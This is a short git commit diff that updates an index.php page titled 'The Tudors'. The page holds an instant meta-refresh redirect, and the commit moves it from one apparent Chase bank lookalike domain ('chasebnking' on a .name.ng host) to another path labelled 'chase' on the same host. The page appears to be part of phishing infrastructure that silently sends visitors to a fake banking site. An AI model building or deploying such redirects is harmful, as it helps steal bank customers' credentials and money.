eb2e9077b1318ea77208554c593d78f40baa8908
luqmjpro <73815937+luqmjpro@users.noreply.github.com>
2020-11-02 20:46:52 +0000

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <html xmlns="http://www.w3.org/1999/xhtml">    
   <head>      
     <title>The Tudors</title>      
-    <meta http-equiv="refresh" content="0;URL='https://secure01a.chasebnking.veri.name.ng/'" />    
+    <meta http-equiv="refresh" content="0;URL='https://veri.name.ng/chase'" />    
   </head>    
   <body> 
   
